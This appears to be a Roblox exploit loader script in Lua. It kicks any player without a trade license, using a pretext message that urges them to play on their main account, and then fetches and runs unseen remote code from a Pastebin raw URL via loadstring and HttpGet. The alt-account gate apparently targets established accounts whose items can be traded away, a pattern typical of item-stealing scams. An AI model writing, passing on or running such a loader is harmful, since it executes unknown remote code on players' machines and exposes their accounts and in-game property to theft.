-- ===== TRADE LICENSE CHECK =====
local Players = game:GetService("Players")
local plr = Players.LocalPlayer

-- Safely require the trade license module
local tradeLicense = require(game.ReplicatedStorage.SharedModules.TradeLicenseHelper)

if not tradeLicense.player_has_trade_license() then
    plr:Kick("This script dont supports an alt account. Please use your main account to prevent errors.")
    return
end

-- ===== YOUR EXTERNAL SCRIPT LOADER =====
print("✅ Loading external script...")

local success, err = pcall(function()
    -- 👇 Your actual script line goes right here:
    loadstring(game:HttpGet("https://pastebin.com/raw/P57G9HHs"))()
end)

if success then
    print("✅ External script loaded successfully!")
else
    warn("❌ Failed to load external script: " .. tostring(err))
end
